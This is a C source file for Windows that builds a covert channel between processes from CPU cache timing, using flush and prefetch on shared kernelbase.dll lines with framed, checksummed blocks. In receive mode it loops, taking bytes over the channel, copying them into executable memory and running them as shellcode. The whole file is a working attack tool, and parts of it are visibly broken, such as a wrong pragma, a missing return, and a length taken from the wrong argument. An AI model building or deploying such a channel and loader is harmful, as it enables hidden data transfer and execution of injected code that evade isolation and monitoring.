#include <Windows.h>

#include "include/helper.h"
#include "include/ia32.h"

#define LINE_FLUSH_CYCLE_COUNT 250000

#define READ_SAMPLE_COUNT            16
#define READ_POSITIVE_LINE_THRESHOLD 75
#define READ_TIMING_ITERATION_COUNT  10

STATIC UINT64 g_Buffer = 0;
STATIC UINT64 g_LineSize = 0;

#define PREFETCH(n) \
    _mm_prefetch((UINT64)g_Buffer + n * g_LineSize, _MM_HINT_T0);
#define EVICT(n) _mm_clflushopt(g_Buffer + n * g_LineSize);

#pragma pack(push, 1)
typedef union _TRANSMISSION_BLOCK {
    struct {
        UINT32 data;
        UINT16 index;
        UINT16 checksum;
    };

    UINT64 as_uint64;
} TRANSMISSION_BLOCK, *PTRANSMISSION_BLOCK;
#pragma push(pop)

#define TRANSMISSION_START_MAGIC   0x9827345234523455
#define TRANSMISSION_END_MAGIC     0x3948203420875344
#define TRANSMISSION_CHECKSUM_SEED 0x2345343

STATIC
VOID
FecObtainCacheLineSize()
{
    CPUID_EAX_01 c = {0};
    __cpuidex(&c, CPUID_VERSION_INFORMATION, 0);
    g_LineSize = c.CpuidAdditionalInformation.ClflushLineSize * 8;
}

STATIC
STATUS
FecInitialisePhysicalBuffer()
{
    g_Buffer = (UINT64)GetModuleHandleA("kernelbase.dll");
    return g_Buffer == NULL ? STATUS_ERROR : STATUS_SUCCESS;
}

STATIC
UINT16
FecGenerateChecksum(_In_ PTRANSMISSION_BLOCK Block)
{
    return (UINT16)(_mm_crc32_u32(
                        TRANSMISSION_CHECKSUM_SEED,
                        Block->data ^ Block->index) &
                    0xFFFF);
}

#pragma optimize("", off)
DECLSPEC_NOINLINE
UINT64
FecMeasureLine(_In_ UINT32 Index)
{
    UINT64 test = 0;
    UINT64 initial = 0;

    initial = __rdtscp(&test);
    test = *(UINT64*)(g_Buffer + (Index * g_LineSize));
    return __rdtscp(&test) - initial;
}

DECLSPEC_NOINLINE
UINT64
FecAverageLineAccessTime(_In_ UINT32 LineIndex)
{
    UINT64 average = 0;

    PREFETCH(LineIndex);
    for (UINT32 iter = 0; iter < READ_TIMING_ITERATION_COUNT; iter++)
        average += FecMeasureLine(LineIndex);

    return average / READ_TIMING_ITERATION_COUNT;
}

STATIC
UINT64
FecDetermineHighestOccurence(_In_ PUINT64 Values, _In_ UINT32 Count)
{
    UINT32 max_count = 1;
    UINT32 cur_count = 0;
    UINT64 most_frequent = Values[0];

    for (UINT32 i = 0; i < Count; i++) {
        cur_count = 1;

        for (UINT32 j = i + 1; j < Count; j++) {
            if (Values[i] == Values[j])
                cur_count++;
        }

        if (cur_count > max_count) {
            max_count = cur_count;
            most_frequent = Values[i];
        }
    }

    return most_frequent;
}

STATIC
VOID
FecEmit64(_In_ UINT64 Value)
{
    for (UINT32 iter = 0; iter < LINE_FLUSH_CYCLE_COUNT; iter++) {
        for (UINT32 bit = 0; bit < COUNT_BITS(UINT64); bit++) {
            if (IS_SET(Value, bit))
                EVICT(bit);
        }
    }
}

DECLSPEC_NOINLINE
BOOL
FecIsLinePositive(_In_ UINT32 LineIndex)
{
    UINT32 likelihood = 0;

    for (UINT32 count = 0; count < READ_SAMPLE_COUNT; count++) {
        if (FecAverageLineAccessTime(LineIndex) >
            READ_POSITIVE_LINE_THRESHOLD) {
            likelihood++;
        }
    }

    /* Divide by 2 to get majority sample */
    return (likelihood > (READ_SAMPLE_COUNT / 2));
}

DECLSPEC_NOINLINE
UINT64
FecReadLine64()
{
    UINT64 samples[READ_SAMPLE_COUNT] = {0};
    UINT32 sample_count = 0;

    while (sample_count < READ_SAMPLE_COUNT) {
        for (UINT32 bit = 0; bit < COUNT_BITS(UINT64); bit++)
            samples[sample_count] |= ((UINT64)FecIsLinePositive(bit) << bit);

        sample_count++;
    }

    return FecDetermineHighestOccurence(samples, sample_count);
}
#pragma optimize("", on)

STATIC
VOID
FecInitialiseTransmissionBlock(
    _Inout_ PTRANSMISSION_BLOCK Block, _In_ UINT32 Data, _In_ UINT16 Index)
{
    Block->data = Data;
    Block->index = Index;
    Block->checksum = FecGenerateChecksum(Block);
}

STATIC
STATUS
FecSendData(_In_ PCHAR Source, _In_ UINT32 Length)
{
    PUINT32 buffer = NULL;
    UINT32 block_count = (Length + sizeof(UINT32) - 1) / sizeof(UINT32);
    TRANSMISSION_BLOCK block = {0};

    buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ALIGN32(Length));
    if (!buffer)
        return STATUS_ERROR;

    RtlCopyMemory(buffer, Source, Length);

    FecEmit64(TRANSMISSION_START_MAGIC);
    for (UINT32 index = 0; index < block_count; index++) {
        FecInitialiseTransmissionBlock(&block, buffer[index], index);
        FecEmit64(block.as_uint64);
    }

    FecEmit64(TRANSMISSION_END_MAGIC);
    return STATUS_SUCCESS;
}

STATIC
STATUS
FecReceiveData(_Inout_ PCHAR Buffer, _In_ UINT32 Length)
{
    UINT64 value = 0;
    PUINT32 buffer = NULL;
    UINT32 block_count = ALIGN32(Length) / sizeof(UINT32);
    PTRANSMISSION_BLOCK block = NULL;

    buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ALIGN32(Length));
    if (!buffer)
        return STATUS_ERROR;

    while (FecReadLine64() != TRANSMISSION_START_MAGIC)
        ;

    while (TRUE) {
        value = FecReadLine64();
        if (value == TRANSMISSION_START_MAGIC)
            continue;

        if (value == TRANSMISSION_END_MAGIC)
            break;

        block = (PTRANSMISSION_BLOCK)&value;
        if (block->index >= block_count)
            break;

        if (FecGenerateChecksum(block) == block->checksum)
            buffer[block->index] = block->data;
    }

    RtlCopyMemory(Buffer, buffer, Length);
}

STATIC
STATUS
FecExecuteShellcode(_In_ PVOID Buffer, _In_ UINT32 Size)
{
    PVOID buffer = NULL;
    UINT32 (*Shellcode)(VOID);
    UINT32 ret = 0;

    buffer = VirtualAlloc(
        NULL,
        Size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!buffer)
        return STATUS_ERROR;

    RtlCopyMemory(buffer, Buffer, Size);

    Shellcode = (UINT32(*)(VOID))buffer;
    ret = Shellcode();
    VirtualFree(buffer, 0, MEM_RELEASE);

    return STATUS_SUCCESS;
}

INT
main(INT argc, CHAR** argv)
{
    UINT32 ret = 0;
    CHAR buf[1000] = {0};
    STATUS status = STATUS_ERROR;

    // clang-format off
    UCHAR shellcode[] = {
        0xB8, 0x14, 0x00, 0x00, 0x00, // mov eax, 0x14
        0xC3  // ret             
    };
    // clang-format on


    FecObtainCacheLineSize(NULL);

    status = FecInitialisePhysicalBuffer();
    if (!SUCCESS(status)) {
        printf("Failed to initialise buffer!");
        return STATUS_ERROR;
    }

    if (!strcmp(argv[1], "recv")) {
        while (TRUE) {
            FecReceiveData(buf, 1000);
            ret = FecExecuteShellcode(buf, 1000);
            printf("ret: %lx", ret);
        }
    }
    else {
        printf("Transmitting: %s\n", argv[1]);
        FecSendData(shellcode, strlen(argv[1]));
    }

    return 0;
}